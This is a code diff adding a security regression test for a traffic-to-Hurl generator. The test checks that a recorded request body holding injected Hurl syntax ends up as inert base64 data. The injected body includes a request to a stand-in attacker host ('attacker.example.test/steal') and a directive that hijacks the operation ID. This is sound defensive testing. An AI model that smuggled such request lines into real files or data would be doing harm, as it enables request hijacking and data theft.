@@ -15,6 +15,7 @@ from entroping.core.safe_write import SafeWriteError
 from entroping.core.traffic_filters import TrafficCaptureFilters
 from entroping.core.traffic_redactor import redact_traffic_exchange
 from entroping.core.traffic_store import TrafficStore
+from entroping.models.hurl import parse_hurl_exchanges, parse_hurl_metadata
 from entroping.models.traffic import TrafficBody, TrafficExchange, TrafficRequest, TrafficResponse
 
 
@@ -119,6 +120,40 @@ def _record_sensitive_freeze_exchange(
         ),
     )
     TrafficStore.open_project(project_root).record_exchange(redact_traffic_exchange(exchange))
+
+
+def _record_structural_body_freeze_exchange(project_root: Path) -> None:
+    exchange = TrafficExchange(
+        captured_at=datetime(2026, 5, 30, 12, 6, tzinfo=UTC),
+        duration_ms=45,
+        request=TrafficRequest(
+            method="POST",
+            url="https://api.example.test/checkout",
+            headers={"Content-Type": "application/json"},
+            body=TrafficBody(
+                content_type="application/json",
+                size_bytes=112,
+                text=(
+                    '{"cart_id":"cart-1"}\n'
+                    "GET https://attacker.example.test/steal\n"
+                    "HTTP 200\n"
+                    "[Asserts]\n"
+                    "# entroping: operation_id=hijacked\n"
+                ),
+            ),
+        ),
+        response=TrafficResponse(
+            status_code=201,
+            headers={"Content-Type": "application/json"},
+            body=TrafficBody(
+                content_type="application/json",
+                size_bytes=43,
+                text='{"id":"ord_123","status":"accepted"}',
+            ),
+        ),
+        redacted=True,
+    )
+    TrafficStore.open_project(project_root).record_exchange(exchange)
 
 
 def _record_sensitive_mock_exchange(
@@ -366,6 +401,26 @@ def test_run_freeze_writes_generated_hurl(tmp_path: Path) -> None:
     assert manifest["source"]["record_count"] == 1
     assert manifest["artifacts"][0]["kind"] == "hurl"
     assert manifest["artifacts"][0]["path"] == "tests/generated/checkout_flow.hurl"
+
+
+@pytest.mark.security
+def test_run_freeze_writes_structural_request_body_as_inert_hurl_data(
+    tmp_path: Path,
+) -> None:
+    _record_structural_body_freeze_exchange(tmp_path)
+
+    result = run_freeze(
+        project_root=tmp_path,
+        name="checkout_flow",
+        golden=False,
+        hurl_validator=lambda content, display_path: None,
+    )
+
+    content = result.output_path.read_text(encoding="utf-8")
+    assert len(parse_hurl_exchanges(content)) == 1
+    assert parse_hurl_metadata(content).operation_id is None
+    assert "GET https://attacker.example.test/steal" not in content
+    assert "base64," in content
 
 
 def test_run_freeze_applies_capture_filters_before_hurl_generation(tmp_path: Path) -> None:
